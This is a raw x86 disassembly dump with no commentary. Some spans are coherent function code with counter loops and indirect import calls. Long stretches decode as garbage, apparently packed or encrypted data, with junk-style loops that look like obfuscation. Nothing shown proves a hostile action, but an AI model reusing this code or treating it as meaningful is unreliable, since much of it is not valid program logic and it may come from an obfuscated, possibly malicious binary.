  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073f2
  407387:	mov    ah,0xa2
  407389:	dec    ecx
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x487e7e7c
  407393:	aad    0x4a
  407395:	xchg   ebp,eax
  407396:	cld    
  407397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407398:	mov    dl,0xa4
  40739a:	jmp    0x4a923a86
  40739f:	adc    al,BYTE PTR [edx]
  4073a1:	retf   
  4073a2:	in     al,0x1b
  4073a4:	shl    DWORD PTR [edi],1
  4073a6:	pop    edi
  4073a7:	lods   eax,DWORD PTR ds:[esi]
  4073a8:	loopne 0x407378
  4073aa:	cli    
  4073ab:	fsub   QWORD PTR [esi-0x4ed6dee8]
  4073b1:	icebp  
  4073b2:	mov    esi,0x779c705f
  4073b7:	or     eax,0xd4473a5c
  4073bc:	jne    0x407383
  4073be:	add    al,BYTE PTR [edx-0x3a46b04]
  4073c4:	aas    
  4073c5:	fbld   TBYTE PTR [ebp+0x25b6fd24]
  4073cb:	mov    WORD PTR ds:0x5129a053,?
  4073d1:	call   0xf44c:0x540a66eb
  4073d8:	xlat   BYTE PTR ds:[ebx]
  4073d9:	sahf   
  4073da:	mov    DWORD PTR [edi+0x4],esp
  4073dd:	dec    ecx
  4073de:	ja     0x4073c4
  4073e0:	push   cs
  4073e1:	repz jnp 0x40744a
  4073e4:	les    ebx,FWORD PTR [edi-0x41]
  4073e7:	retf   
  4073e8:	out    0x8a,eax
  4073ea:	in     eax,dx
  4073eb:	xor    edi,DWORD PTR [esi]
  4073ed:	lods   al,BYTE PTR ds:[esi]
  4073ee:	rcr    DWORD PTR [ecx+ebx*4-0x64],cl
  4073f2:	imul   esi,DWORD PTR [esi-0x5a00ba3e],0x2cabd402
  4073fc:	add    DWORD PTR [ecx+0x54],eax
  4073ff:	and    ebx,edi
  407401:	mov    ds:0x7678f139,al
  407406:	ror    DWORD PTR [esi+0x8],1
  407409:	xchg   BYTE PTR [ebp+0x31a0bfcc],ah
  40740f:	jmp    0x40747e
  407411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407412:	sub    eax,esi
  407414:	or     al,BYTE PTR [esi+0x5f872531]
  40741a:	icebp  
  40741b:	xor    dl,BYTE PTR [ecx]
  40741d:	adc    bl,BYTE PTR [edi-0x7cfae520]
  407423:	es in  eax,0x68
  407426:	cmp    DWORD PTR [ecx],edx
  407428:	fcmovb st,st(6)
  40742a:	jnp    0x4073ec
  40742c:	std    
  40742d:	jo     0x40744c
  40742f:	push   ecx
  407430:	addr16 dec ecx
  407432:	sbb    al,0x69
  407434:	jl     0x4073b8
  407436:	add    DWORD PTR [edx+0x4c],esp
  407439:	mov    edi,0xdc487472
  40743e:	icebp  
  40743f:	scas   al,BYTE PTR es:[edi]
  407440:	or     al,0x21
  407442:	xchg   esi,eax
  407443:	sub    DWORD PTR [eax-0x1901a424],edi
  407449:	ss pop ecx
  40744b:	scas   al,BYTE PTR es:[edi]
  40744c:	out    dx,al
  40744d:	(bad)  
  40744e:	jge    0x407486
  407450:	pop    edx
  407451:	or     al,0x29
  407453:	pushf  
  407454:	pop    esi
  407455:	add    eax,0xf82c1da6
  40745a:	das    
  40745b:	lods   eax,DWORD PTR ds:[esi]
  40745c:	shl    edx,cl
  40745e:	cmp    ch,bh
  407460:	stos   BYTE PTR es:[edi],al
  407461:	out    0x78,al
  407463:	fdiv   QWORD PTR [esi+0x5355d371]
  407469:	pop    esi
  40746a:	in     eax,dx
  40746b:	xor    al,ch
  40746d:	jl     0x407409
  40746f:	jno    0x4074b1
  407471:	cmp    BYTE PTR [ecx],bh
  407473:	in     eax,dx
  407474:	add    DWORD PTR [esi+0x5e],esp
  407477:	jmp    0xba68:0x88749b37
  40747e:	sbb    bl,BYTE PTR [ebx+eiz*4]
  407481:	inc    edi
  407482:	mov    eax,0xf0c88f75
  407487:	sbb    eax,0x8f9132f5
  40748c:	aam    0xd5
  40748e:	in     eax,dx
  40748f:	stos   DWORD PTR es:[edi],eax
  407490:	pusha  
  407491:	xlat   BYTE PTR ds:[ebx]
  407492:	pop    edx
  407493:	push   0xd8f500ef
  407498:	aam    0x96
  40749a:	xor    al,0xee
  40749c:	fnsave gs:[eax-0x5e]
  4074a0:	ret    0x43f9
  4074a3:	mov    ecx,0x6638728b
  4074a8:	(bad)  
  4074a9:	cld    
  4074aa:	(bad)  
  4074ab:	push   edi
  4074ac:	retf   
  4074ad:	mov    ds:0x4da15bc2,eax
  4074b2:	xchg   edx,eax
  4074b3:	jle    0x407447
  4074b5:	neg    DWORD PTR [edi+0x345340bd]
  4074bb:	and    DWORD PTR [edi+0x30],esp
  4074be:	cmp    eax,0x56e3afee
  4074c3:	scas   al,BYTE PTR es:[edi]
  4074c4:	mov    ah,0xa4
  4074c6:	jb     0x40747c
  4074c8:	jmp    0x407541
  4074ca:	jno    0x4074ab
  4074cc:	jne    0x407492
  4074ce:	fadd   QWORD PTR [ebp-0x66]
  4074d1:	xlat   BYTE PTR ds:[ebx]
  4074d2:	push   edi
  4074d3:	push   0x470815b
  4074d8:	in     al,dx
  4074d9:	xchg   ecx,eax
  4074da:	mov    dl,BYTE PTR [ebx]
  4074dc:	arpl   ax,ax
  4074de:	mov    sp,WORD PTR [esi+0x71]
  4074e2:	imul   ebp,DWORD PTR [edx],0x85b6f45b
  4074e8:	pop    es
  4074e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074ea:	sub    al,0xed
  4074ec:	cmp    edi,esi
  4074ee:	pusha  
  4074ef:	and    ch,bl
  4074f1:	mov    dh,0xd7
  4074f3:	xor    eax,0x123cc996
  4074f8:	xor    eax,0xea442e1
  4074fd:	pop    eax
  4074fe:	cs mov ah,0x88
  407501:	cmc    
  407502:	cmp    esp,DWORD PTR [edx+0xf2e5f4b]
  407508:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40750a:	mov    esi,0xa9c355b1
  40750f:	add    dh,bl
  407511:	int    0x9
  407513:	jp     0x407537
  407515:	shr    BYTE PTR [edx+0x4f81b215],1
  40751b:	dec    ecx
  40751c:	mov    ds:0x5fb44417,eax
  407521:	fsub   DWORD PTR [edi]
  407523:	or     cl,dl
  407525:	call   0x7714:0x4a8cc4c5
  40752c:	xor    DWORD PTR [ebp+eax*4-0x6e],ecx
  407530:	xor    BYTE PTR [eax-0xf],ch
  407533:	mov    edx,0x6a12586e
  407538:	dec    ecx
  407539:	stos   BYTE PTR es:[edi],al
  40753a:	test   DWORD PTR [edx],ebp
  40753c:	icebp  
  40753d:	mov    ds:0x90d122a8,eax
  407542:	lahf   
  407543:	mov    ah,0x4c
  407545:	push   esp
  407546:	and    eax,0x703ad7c8
  40754b:	mov    WORD PTR [edx+ebp*2-0x3f],es
  40754f:	pop    esp
  407550:	xchg   ecx,eax
  407551:	out    0x9a,eax
  407553:	jno    0x40756b
  407555:	(bad)  
  407556:	stos   BYTE PTR es:[edi],al
  407557:	add    DWORD PTR [ebp+0x1f],eax
  40755a:	lods   al,BYTE PTR ds:[esi]
  40755b:	js     0x4075b9
  40755d:	loopne 0x407569
  40755f:	dec    ecx
  407560:	mov    BYTE PTR [esi-0x7509ae38],0x33
  407567:	mov    dh,al
  407569:	test   eax,0xc219182
  40756e:	lahf   
  40756f:	das    
  407570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407571:	and    eax,0xabbd550e
  407576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407577:	dec    ebx
  407578:	mov    edi,0xde94b948
  40757d:	jl     0x4075dd
  40757f:	xchg   esi,eax
  407580:	cmp    dh,BYTE PTR [ecx+edi*8]
  407583:	fisubr WORD PTR [ecx-0x1]
  407586:	mov    ecx,0x39701942
  40758b:	sbb    DWORD PTR [ebx+0xc],eax
  40758e:	xchg   DWORD PTR [ecx+0x53],ebp
  407591:	test   DWORD PTR [ecx],eax
  407593:	lods   eax,DWORD PTR ds:[esi]
  407594:	rcr    BYTE PTR [eax+0x5efd4358],1
  40759a:	sub    al,0x9e
  40759c:	arpl   di,ax
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	mov    ah,BYTE PTR ds:0xc0119d05
  40765b:	jle    0x4076db
  40765d:	add    eax,0x237e7e7c
  407662:	stc    
  407663:	(bad)  
  407664:	jbe    0x407699
  407666:	out    0x59,al
  407668:	pop    ebx
  407669:	test   al,0x7b
  40766b:	bound  ebx,QWORD PTR [eax+0x45]
  40766e:	repz repz inc eax
  407671:	sub    DWORD PTR [ebx-0x5e335e21],0x41
  407678:	das    
  407679:	jmp    ecx
  40767b:	push   ss
  40767c:	adc    eax,0x5784a669
  407681:	popf   
  407682:	rol    BYTE PTR [ebp-0x5],0x42
  407686:	packuswb mm2,QWORD PTR [edi]
  407689:	push   esp
  40768a:	xchg   edi,eax
  40768b:	or     dh,bl
  40768d:	(bad)  
  40768e:	push   edi
  40768f:	inc    edx
  407690:	sbb    al,0x31
  407692:	dec    esi
  407693:	add    al,0x88
  407695:	mov    bh,0x54
  407697:	dec    ebp
  407698:	jmp    0x4076f2
  40769a:	sbb    al,0x9c
  40769c:	xor    DWORD PTR [esi+0x277d75c0],ebx
  4076a2:	es adc eax,0x8a455ab6
  4076a8:	dec    esi
  4076a9:	fsubp  st(6),st
  4076ab:	out    0x1a,al
  4076ad:	mov    dh,0x2
  4076af:	dec    ebp
  4076b0:	fstp   QWORD PTR [esi+ebp*8]
  4076b3:	or     DWORD PTR [esi],ebx
  4076b5:	pusha  
  4076b6:	mov    ch,0x37
  4076b8:	jo     0x40764d
  4076ba:	or     ah,BYTE PTR [ecx]
  4076bc:	ret    
  4076bd:	xchg   edx,eax
  4076be:	test   al,0xe
  4076c0:	sub    DWORD PTR [eax-0x44c0c2],ebp
  4076c6:	mov    ecx,0x3ab5af96
  4076cb:	gs jo  0x407680
  4076ce:	add    ecx,0x6d
  4076d1:	pop    ebp
  4076d2:	mov    al,ds:0x80cbbd11
  4076d7:	mov    esp,0x40fcc5b8
  4076dc:	test   esp,esp
  4076de:	cmp    eax,0x13ec5f86
  4076e3:	cmp    esi,DWORD PTR [esi-0x711f931d]
  4076e9:	adc    al,0x65
  4076eb:	mov    WORD PTR cs:[esp+esi*1+0x6c83a6c1],fs
  4076f3:	repnz ins BYTE PTR es:[edi],dx
  4076f5:	push   esp
  4076f6:	sub    BYTE PTR [ebx+0x31f57dc3],bl
  4076fc:	or     cl,BYTE PTR [eax+0x2fda0fbe]
  407702:	or     al,0xe8
  407704:	xor    dh,0xde
  407707:	xchg   esi,eax
  407708:	idiv   cl
  40770a:	push   eax
  40770b:	jmp    0x1236714
  407710:	dec    eax
  407711:	mul    dh
  407713:	ss and al,0x55
  407716:	sbb    BYTE PTR [ecx-0x43],bl
  407719:	push   eax
  40771a:	adc    dl,BYTE PTR [ebx]
  40771c:	(bad)  
  40771d:	push   ss
  40771e:	mov    esi,0x2098bd07
  407723:	cmp    cl,al
  407725:	xchg   esi,eax
  407726:	jmp    0xf55bee04
  40772b:	fstp   QWORD PTR [edx+0x46a94778]
  407731:	xchg   edi,eax
  407732:	xor    BYTE PTR [edx-0x5a],bl
  407735:	add    al,0x16
  407737:	cmp    ah,dh
  407739:	sahf   
  40773a:	(bad)  
  40773c:	or     eax,0xc7f07ddd
  407741:	idiv   BYTE PTR [esp+eax*1-0x1236da11]
  407748:	sbb    DWORD PTR [ebx+0x27],ebp
  40774b:	dec    eax
  40774c:	pop    ecx
  40774d:	(bad)  
  407750:	pop    ecx
  407751:	push   ss
  407752:	xor    ebx,DWORD PTR [ebp+0x4b]
  407755:	inc    ebp
  407756:	push   DWORD PTR [esi+0x34]
  407759:	dec    edx
  40775a:	aam    0xc2
  40775c:	hlt    
  40775d:	and    edx,esi
  40775f:	ret    
  407760:	push   edx
  407761:	daa    
  407762:	int    0xf3
  407764:	icebp  
  407765:	in     eax,0xf7
  407767:	jmp    0x27a0f42d
  40776c:	pop    edx
  40776d:	and    DWORD PTR [edx+0x6],0xd5c0ada9
  407774:	adc    eax,0x7f02d342
  407779:	jge    0x4077a7
  40777b:	lds    eax,FWORD PTR [esi+0x458d187a]
  407781:	mov    ds,WORD PTR [ebx]
  407783:	inc    dx
  407785:	adc    edx,ebx
  407787:	pop    edx
  407788:	dec    edi
  407789:	xor    ah,BYTE PTR [edx+eax*4+0x58860f08]
  407790:	xchg   esi,eax
  407791:	adc    eax,0xd7ba780a
  407796:	push   es
  407797:	pop    ecx
  407798:	pop    es
  407799:	ret    
  40779a:	fstp   QWORD PTR [edx-0x31]
  40779d:	add    al,0x5
  40779f:	xchg   esp,eax
  4077a0:	pop    ebx
  4077a1:	mov    al,ds:0xd20c0894
  4077a6:	enter  0x868d,0xd1
  4077aa:	dec    eax
  4077ab:	xchg   DWORD PTR [esi-0x32094e7b],esi
  4077b1:	les    edx,FWORD PTR [eax+0x4b]
  4077b4:	pop    ds
  4077b5:	dec    ecx
  4077b7:	in     al,dx
  4077b8:	mov    esp,DWORD PTR [esi+0x6c]
  4077bb:	sbb    al,0x77
  4077bd:	outs   dx,BYTE PTR ds:[esi]
  4077be:	cmp    BYTE PTR [esi],ch
  4077c0:	lock (bad) 
  4077c2:	call   0x239b671d
  4077c7:	popa   
  4077c8:	inc    ecx
  4077c9:	dec    ebx
  4077ca:	int    0x73
  4077cc:	push   es
  4077cd:	outs   dx,DWORD PTR ds:[esi]
  4077ce:	xor    eax,0x730a9027
  4077d3:	scas   eax,DWORD PTR es:[edi]
  4077d4:	add    DWORD PTR [edi+esi*1],edi
  4077d7:	test   DWORD PTR [ecx-0x17],ebp
  4077da:	xor    ch,0x46
  4077dd:	mov    bh,0xca
  4077df:	xchg   ebx,eax
  4077e0:	add    al,0xee
  4077e2:	pop    esp
  4077e3:	mov    bx,WORD PTR [esi+0x8]
  4077e7:	fs (bad) 
  4077e9:	aaa    
  4077ea:	and    edx,DWORD PTR [edx+0x3e]
  4077ed:	xlat   BYTE PTR ds:[ebx]
  4077ee:	add    ch,ah
  4077f0:	sbb    ebp,DWORD PTR [edi]
  4077f2:	cmp    ebx,DWORD PTR ds:0x4357eec1
  4077f8:	ins    BYTE PTR es:[edi],dx
  4077f9:	mov    ch,0x7a
  4077fb:	cli    
  4077fc:	push   ds
  4077fd:	cmp    bl,BYTE PTR [ecx+ebx*4+0x6f8a0580]
  407804:	ins    BYTE PTR es:[edi],dx
  407805:	dec    edx
  407806:	(bad)  
  407807:	cmp    al,0x3d
  407809:	in     eax,0x86
  40780b:	push   0xffffffd3
  40780d:	jo     0x4077be
  40780f:	mov    eax,ds:0xf3cd64e8
  407814:	outs   dx,DWORD PTR ds:[esi]
  407815:	sbb    DWORD PTR [esp+ebp*8],ebp
  407818:	add    ch,BYTE PTR [edx+0x3a]
  40781b:	add    eax,DWORD PTR [ebp-0x4c85319c]
  407821:	fwait
  407822:	adc    BYTE PTR [ecx+0x15d1beb2],cl
  407828:	or     esp,DWORD PTR [ebx-0xf]
  40782b:	fsubr  DWORD PTR [edi]
  40782d:	pop    ds
  40782e:	(bad)  [edx+0x66]
  407831:	fstp   QWORD PTR [edi+0x10]
  407834:	jecxz  0x4077d0
  407836:	lock or esi,ebp
  407839:	pop    ds
  40783a:	add    al,0xd0
  40783c:	inc    ax
  40783e:	sar    BYTE PTR [edi+edi*2-0x1f7cdb3],0x4b
  407846:	sbb    bh,BYTE PTR [edx]
  407848:	outs   dx,BYTE PTR ds:[esi]
  407849:	add    cl,BYTE PTR [edx]
  40784b:	jne    0x407847
  40784d:	mov    WORD PTR [eax+eax*8],es
  407850:	loop   0x4078c5
  407852:	dec    edi
  407853:	jp     0x40780a
  407855:	aaa    
  407856:	ficomp WORD PTR [edx]
  407858:	clc    
  407859:	add    edi,esi
  40785b:	outs   dx,BYTE PTR ds:[esi]
  40785c:	xchg   DWORD PTR ds:0xad8383de,ebx
  407862:	nop
  407863:	push   esp
  407864:	loope  0x4078de
  407866:	jg     0x4078d6
  407868:	fimul  DWORD PTR [esi+ebx*2]
  40786b:	es push esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x98,eax
  407922:	xchg   BYTE PTR [edi+edi*4],bl
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0x707e7e7c
  40792e:	xchg   esp,eax
  40792f:	iret   
  407930:	pop    ecx
  407931:	(bad)  
  407932:	int    0x71
  407934:	aad    0x6c
  407936:	imul   ebp,DWORD PTR [esi+0x1d],0x16290a27
  40793d:	inc    esp
  40793e:	addr16 mov edi,cs
  407941:	fild   QWORD PTR [esi-0x3363b292]
  407947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407948:	cdq    
  407949:	sub    eax,0x1ef4eb97
  40794e:	sbb    BYTE PTR [esi-0x56],ah
  407951:	retf   0xbb6
  407954:	jle    0x4079b0
  407956:	cmp    esp,edi
  407958:	inc    esp
  407959:	push   ds
  40795a:	adc    eax,0x4101403e
  40795f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407960:	sbb    edx,DWORD PTR [ebp-0x5f2bf2e2]
  407966:	hlt    
  407967:	dec    ebp
  407968:	mov    esi,0xa9d34f9c
  40796d:	mov    ebx,0xecb90257
  407972:	push   ecx
  407973:	sar    DWORD PTR [esp+esi*4],cl
  407976:	call   0xa959:0x298937c
  40797d:	dec    esp
  40797e:	or     al,0x9f
  407980:	repz sbb al,0x9
  407983:	xlat   BYTE PTR ds:[ebx]
  407984:	outs   dx,BYTE PTR ds:[esi]
  407985:	enter  0xafcc,0x3
  407989:	in     al,0x48
  40798b:	push   esi
  40798c:	shr    esi,0x5e
  40798f:	repnz xor ebx,ebp
  407992:	jb     0x4079e4
  407994:	aad    0x2a
  407996:	es scas eax,DWORD PTR es:[edi]
  407998:	cs dec ecx
  40799a:	lods   eax,DWORD PTR ds:[esi]
  40799b:	sub    eax,0x1149f446
  4079a0:	adc    edi,DWORD PTR [esi]
  4079a2:	xchg   edi,eax
  4079a3:	xor    esp,DWORD PTR [edx+ebx*4]
  4079a6:	lock pop es
  4079a8:	mov    ds:0xb995d447,eax
  4079ad:	retf   0x1896
  4079b0:	sti    
  4079b1:	into   
  4079b2:	jl     0x407a2b
  4079b4:	mov    esp,0xefb88d9c
  4079b9:	pop    edx
  4079ba:	pusha  
  4079bb:	cld    
  4079bc:	pop    ebx
  4079bd:	idiv   DWORD PTR [esi+0x792288a6]
  4079c3:	out    0x42,eax
  4079c5:	mov    eax,0xc274bc46
  4079ca:	ins    BYTE PTR es:[edi],dx
  4079cb:	les    esp,FWORD PTR [edi-0x3fb5d1a]
  4079d1:	fimul  WORD PTR [ecx+0x4e]
  4079d4:	ins    BYTE PTR es:[edi],dx
  4079d5:	push   ebx
  4079d6:	dec    edi
  4079d7:	add    eax,0x7b971c84
  4079dc:	inc    edx
  4079dd:	pop    esp
  4079de:	in     eax,0x6e
  4079e0:	mov    esp,0xc5bd7550
  4079e5:	clc    
  4079e6:	dec    ebp
  4079e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079e8:	add    DWORD PTR [ecx],ecx
  4079ea:	pop    ecx
  4079eb:	(bad)  
  4079ec:	in     eax,0x31
  4079ee:	and    bh,BYTE PTR [ecx-0x61582d81]
  4079f4:	bound  esp,QWORD PTR [ecx-0x45]
  4079f7:	add    eax,0x2d956487
  4079fc:	shl    BYTE PTR [ebx-0x2d6e92be],cl
  407a02:	pop    ss
  407a03:	pop    esi
  407a04:	pop    edx
  407a05:	popa   
  407a06:	xchg   ebp,eax
  407a07:	lock std 
  407a09:	div    BYTE PTR [ebx-0x14]
  407a0c:	sti    
  407a0d:	xor    eax,0xf2ca16ca
  407a12:	push   ds
  407a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a14:	mov    ebp,0x28cf00fb
  407a19:	mov    ds,edi
  407a1b:	pop    ss
  407a1c:	repnz dec esi
  407a1e:	adc    cl,ah
  407a20:	mov    ds:0xe33a8853,al
  407a25:	sar    BYTE PTR [esi+0x563e5892],cl
  407a2b:	aas    
  407a2c:	(bad)  
  407a2d:	out    0xc9,al
  407a2f:	ret    
  407a30:	push   eax
  407a31:	pop    esp
  407a32:	push   0x59
  407a34:	inc    esi
  407a35:	in     al,0xc3
  407a37:	dec    esi
  407a38:	adc    dh,ch
  407a3a:	mov    ecx,0x963422f0
  407a40:	neg    BYTE PTR [eax+0x4f65dad2]
  407a46:	xchg   esi,eax
  407a47:	sub    ch,BYTE PTR [ebx+ecx*1]
  407a4a:	adc    al,0x26
  407a4c:	jmp    0x407a7b
  407a4e:	test   DWORD PTR [edi+0x7b759a4f],ebp
  407a54:	push   es
  407a55:	ret    
  407a56:	pop    esi
  407a57:	pushf  
  407a58:	imul   ebp,DWORD PTR [ecx-0x4e],0xffffffe8
  407a5c:	je     0x407a20
  407a5e:	(bad)  
  407a5f:	test   al,0xdf
  407a61:	pop    edi
  407a62:	pop    ebp
  407a63:	sbb    al,0x5a
  407a65:	lahf   
  407a66:	xor    cl,ch
  407a68:	and    DWORD PTR [eax+0x7e],eax
  407a6b:	jge    0x407acf
  407a6d:	xor    esp,DWORD PTR [ebp-0x62]
  407a70:	loop   0x407a9b
  407a72:	push   es
  407a73:	push   es
  407a74:	mov    esi,0x7a85d301
  407a79:	pop    esi
  407a7a:	popf   
  407a7b:	loope  0x407ad3
  407a7d:	test   BYTE PTR [eax-0x2d],dh
  407a80:	push   ebx
  407a81:	push   esp
  407a82:	test   eax,0x8ee651c6
  407a87:	cmp    ebx,DWORD PTR [ebx+ecx*1+0x8dc8026]
  407a8e:	mov    edx,DWORD PTR [eax-0x7cc039c9]
  407a94:	push   esp
  407a95:	sub    al,0x9f
  407a97:	jp     0x407b07
  407a99:	or     DWORD PTR [ebx+0x3],ebx
  407a9c:	mov    ecx,DWORD PTR [edi-0x2c]
  407a9f:	inc    edx
  407aa0:	mov    esp,0x439233ef
  407aa5:	cmp    eax,0xfee90d5
  407aaa:	sub    eax,0xca8da54b
  407aaf:	(bad)  
  407ab0:	jbe    0x407a51
  407ab2:	ror    BYTE PTR [edx],1
  407ab4:	aas    
  407ab5:	hlt    
  407ab6:	fstp   QWORD PTR [ecx+0x78731dd5]
  407abc:	xchg   ecx,eax
  407abd:	cmc    
  407abe:	dec    ebx
  407abf:	mov    ch,bl
  407ac1:	cmp    BYTE PTR [edx+ebx*1+0x4db120a9],bh
  407ac8:	xor    dl,BYTE PTR [edx+0x36]
  407acb:	out    0xf2,eax
  407acd:	lock inc esi
  407acf:	adc    BYTE PTR ds:0xca0a03e0,bh
  407ad5:	or     edx,DWORD PTR [edi+ebp*8-0x72]
  407ad9:	inc    esp
  407ada:	stc    
  407adb:	pop    edx
  407adc:	aas    
  407add:	and    dl,BYTE PTR [esi+0x58]
  407ae0:	test   eax,0x4375e14e
  407ae5:	enter  0x4665,0x1f
  407ae9:	jge    0x407b42
  407aeb:	sbb    eax,0xc5e57c78
  407af0:	sbb    al,0xc2
  407af2:	into   
  407af3:	mov    al,0xfc
  407af5:	or     eax,0xdefd9f93
  407afa:	(bad)  
  407afb:	outs   dx,DWORD PTR ds:[esi]
  407afc:	mov    dh,al
  407afe:	popf   
  407aff:	mov    bh,0x9b
  407b01:	mov    eax,ds:0x149a00b5
  407b06:	or     ecx,ecx
  407b08:	adc    al,0xcc
  407b0a:	loopne 0x407ad6
  407b0c:	cdq    
  407b0d:	jmp    0xddd2b2db
  407b12:	inc    edx
  407b13:	adc    BYTE PTR [edi+0x5b49f27],ah
  407b19:	outs   dx,BYTE PTR ds:[esi]
  407b1a:	aaa    
  407b1b:	add    eax,0x9004f91b
  407b20:	inc    ebp
  407b21:	ja     0x407abe
  407b23:	mov    al,0xd0
  407b25:	xor    DWORD PTR [ebp+ebp*1+0x30],ebp
  407b29:	imul   esp,esp,0xffffffaf
  407b2c:	xchg   esp,eax
  407b2d:	repz sbb al,0x7b
  407b30:	jl     0x407b7a
  407b32:	dec    eax
  407b33:	fs scas eax,DWORD PTR es:[edi]
  407b35:	aaa    
  407b36:	jmp    0x8201af0a
  407b3b:	adc    eax,0x4337ab
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
